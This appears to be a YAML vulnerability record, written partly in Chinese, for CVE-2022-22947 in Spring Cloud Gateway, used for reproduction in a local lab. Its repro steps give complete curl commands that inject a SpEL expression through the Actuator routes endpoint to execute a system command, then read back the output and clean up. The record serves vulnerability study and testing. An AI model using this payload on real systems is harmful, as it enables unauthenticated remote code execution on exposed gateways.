id: VULN-2026-0002
cve: CVE-2022-22947
title: Spring Cloud Gateway Actuator SpEL 注入导致远程命令执行
component: Spring Cloud Gateway 3.1.0
affected_versions:
- scheme: semver
  introduced: 3.0.0
  fixed: 3.0.7
  exclude: []
- scheme: semver
  introduced: 3.1.0
  fixed: 3.1.1
  exclude: []
cwe: CWE-94 代码注入（NVD 主分类 CWE-917）
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
cvss_score: 10.0
severity: 严重
attack_path:
- 1. 未授权访问 http://127.0.0.1:<LAB_PORT>/actuator，确认 Actuator 端点暴露且含 gateway
- 2. POST /actuator/gateway/routes/<name> 创建带恶意 SpEL 的 AddResponseHeader 过滤器
- 3. POST /actuator/gateway/refresh 触发路由刷新，SpEL 在服务端求值执行 id 命令
- 4. GET /actuator/gateway/routes/<name>，响应头 Result 带出命令回显（Scope 改变，跨安全域影响）
preconditions:
- 网络可达 8080 端口（本部署仅 127.0.0.1:<LAB_PORT>）；compose 的 5005 调试端口不作为利用入口
- Actuator gateway 端点未鉴权（默认配置下暴露）
- 无需认证、无需用户交互（PR:N / UI:N）；S:C 表示可影响网关所在容器/宿主之外的安全域
repro_steps:
- cmd: curl -s -i http://127.0.0.1:<LAB_PORT>/actuator
  expect: HTTP 200，返回 Actuator 端点列表（含 gateway）
- cmd: 'curl -s -i -X POST ''http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'' -H ''Content-Type: application/json''
    --data-binary ''{"id":"hacktest","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new
    String[]{\"id\"}).getInputStream()))}"}}],"uri":"http://example.com","order":0}'''
  expect: HTTP 201，路由创建成功（仅本地靶场，SpEL 内执行 id）
- cmd: curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
  expect: HTTP 200，路由表刷新并触发 SpEL 求值
- cmd: curl -s -i 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest'
  expect: HTTP 200，响应头 Result 含 uid= 命令回显
- cmd: curl -s -i -X DELETE 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/routes/hacktest' && curl -s -i -X POST 'http://127.0.0.1:<LAB_PORT>/actuator/gateway/refresh'
  expect: HTTP 200/204，恶意路由已删除并刷新（cleanup_ok=true）
